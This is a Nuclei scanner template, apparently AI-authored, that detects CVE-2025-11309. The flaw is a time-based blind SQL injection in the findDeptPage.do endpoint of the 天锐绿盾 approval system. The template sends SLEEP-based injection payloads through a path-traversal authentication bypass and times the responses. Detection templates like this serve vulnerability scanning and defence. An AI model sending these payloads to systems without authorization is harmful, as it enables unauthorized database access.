id: cve-2025-11309
info:
  name: "天锐绿盾审批系统 findDeptPage.do SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 天锐绿盾

http:
  - raw:
      - |
        POST /trwfe/login.jsp/.%2e/dept/findDeptPage.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        sort=a.ID_ OR (SELECT 1337 FROM (SELECT(SLEEP(5)))test)
      - |
        POST /trwfe/login.jsp/.%2e/dept/findDeptPage.do HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        sort=a.ID_ OR (SELECT 1337 FROM (SELECT(SLEEP(8)))test)
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '{"total":0,"rows":[]}'
      - type: word
        part: body
        words:
          - "<"
        negative: true
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
